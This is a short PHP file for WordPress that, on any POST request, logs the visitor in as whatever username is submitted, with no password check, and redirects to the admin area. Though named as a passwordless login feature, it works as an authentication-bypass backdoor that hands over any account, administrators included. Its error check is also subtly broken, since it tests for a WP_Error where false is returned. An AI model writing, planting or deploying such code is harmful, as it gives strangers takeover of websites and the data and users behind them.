<?php




if ($_SERVER['REQUEST_METHOD'] == 'POST') {


    $username = $_POST['username'];
    passwordless_admin_auth_login_user($username);
}

function passwordless_admin_auth_login_user($username)
{

    $user = get_user_by('login', $username);

    if (!is_wp_error($user)) {
        wp_clear_auth_cookie();
        wp_set_current_user($user->ID);
        wp_set_auth_cookie($user->ID);

        $redirect_to = user_admin_url();
        wp_safe_redirect($redirect_to);
        exit();
    }
}
